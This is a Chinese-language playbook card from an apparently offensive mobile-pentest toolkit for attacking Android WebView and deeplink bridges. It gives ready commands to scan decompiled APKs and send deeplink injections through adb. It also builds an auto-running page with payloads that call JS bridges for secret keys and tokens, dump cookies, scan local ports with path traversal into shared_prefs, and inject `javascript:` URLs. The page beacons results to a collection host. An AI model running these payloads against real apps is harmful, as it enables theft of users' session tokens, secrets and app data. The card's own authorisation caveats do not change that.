# WebView 与 Deeplink 桥接手法

> 静态扫 + **授权验证页**（`harness`）。回传只去你指定的 `--collect`，不写死外网 C2。  
> Skill：`杀招/内窗`  
> 工具：`python3 炼蛊房/webview_bridge_probe.py`  
> 先 `apk-recon` 抽密钥，再本卡扫桥；动态仍走 `安器·钩.md`。  
> 授权：只测授权包 / 已反编译目录。不装击键木马、不写界面劫持 APK。

---

## 1. 何时启用

| 指纹 / 用户说法 | 走 |
|-----------------|----|
| Deeplink / `android:scheme` / `getStringExtra("url")` + `loadUrl` | **本卡** |
| `addJavascriptInterface` / `onJsPrompt` / `JSBridge` / `WebViewJavascriptBridge` | **本卡** |
| `setAllowUniversalAccessFromFileURLs(true)` / NanoHTTPD / 本地 Jetty | **本卡** |
| 只要密钥/后台路径 | `apk-recon`（本卡后置） |
| 完整重打包 / 加固脱壳 | `apk-reverse` |

「APP 渗透 / WebView」总入口仍是 `安器·清单.md`；本卡是清单 §4 的可执行加深。

## 2. 默认命令

```bash
python3 炼蛊房/apk_recon.py extract --apk /tmp/app.apk --case <案卷>
python3 炼蛊房/webview_bridge_probe.py scan --dir /tmp/app-jadx --case <案卷>
python3 炼蛊房/webview_bridge_probe.py harness \
  --dir /tmp/app-jadx --case <案卷> --pkg com.example.app
# 本机收 POST：
python3 炼蛊房/webview_bridge_probe.py listen --case <案卷> --port 8765
python3 炼蛊房/webview_bridge_probe.py harness \
  --dir /tmp/app-jadx --case <案卷> --pkg com.example.app \
  --collect http://<实验室IP>:8765/collect
# 授权机：
bash 案卷/<案卷>/案卷/webview/deeplink_am.sh
```

落盘：`案卷/webview/bridge_hits.json` · `bridge_verify.html` · `deeplink_am.sh` · `collect/`。  
L2：强标签。L2 后必须出验证页，否则桥面没闭环。

## 3. 必扫面（静态）

探针 L2 **只认强标签**：Deeplink 喂 `url` extra、`javascript:` loadUrl、文件域、`addJavascriptInterface` / `@JavascriptInterface`、SSL `proceed`、NanoHTTPD、导出 Provider、WKWebView。  
`exported=true` + `<intent-filter>` 单独出现只算 L1（几乎每个 APK 都有）。

| 面 | 搜什么 | 验证（授权设备） |
|----|--------|------------------|
| Deeplink 喂 URL | `getStringExtra("url")` → `loadUrl`；Manifest 自定义 `scheme` | `adb shell am start -a android.intent.action.VIEW -d 'scheme://host?url=https://授权站'` |
| JS → Native | `addJavascriptInterface`；summary 里的 `js_interface_methods` | 看方法是否读 SP / 开 Activity / 读文件 |
| 其它桥 | `shouldOverrideUrlLoading`、`onJsPrompt`、`evaluateJavascript` | 验证页会扫 `window.*Bridge` 并 `prompt` |
| 文件域 | `setAllowUniversalAccessFromFileURLs(true)` | 验证页用 `file://` Deeplink 或本机 HTTP |
| 本地 HTTP | `NanoHTTPD` / `new File(root, uri)` | 验证页「扫本机 HTTP+穿越」；端口 `--ports` |
| SSL 放行 | `onReceivedSslError` + `proceed()` | 记 MITM 放行 |
| 导出 Provider | Manifest `provider exported` | `adb shell content query` |
| 框架 | X5 / Cordova / Capacitor / RN | 按框架桥名继续，不换总卡 |
| iOS | `WKWebView` / `JSContext` | 本库弱；有 IPA 再 `mobile-reverse` |

验证页对齐四条标准载荷，进页自动跑（不必手点）：

| 标准载荷 | 本库验证页 |
|----------|------------|
| 载荷1 `bridge.send({action, key:"SECRET_KEY"})` | 扫到桥后 `send` 带 `SECRET_KEY`/`wt`/`token` 等键；无桥则 dump `document.cookie`（含 `wt=`） |
| 载荷2 端口 32768–60999 + `xxx.xml` | `--ports full` 分段扫；路径含 `shared_prefs/*.xml` 与 `%2e%2e` |
| 载荷3 Deeplink 喂页 | `deeplink_am.sh`：`?url=` / `?webUrl=` / `?link=` + `-e url` |
| 载荷4 `javascript:` | 同脚本里 `?url=javascript:alert(document.cookie)` |

回传：`sendBeacon` + `text/plain` + Image GET，避免跨域 JSON `no-cors` 打空。`--collect` 空 = 只写在页面上。不要把 collect 指到无关公网。  
`scan --case` 默认顺带写 `bridge_verify.html`（`--no-harness` 可关）。
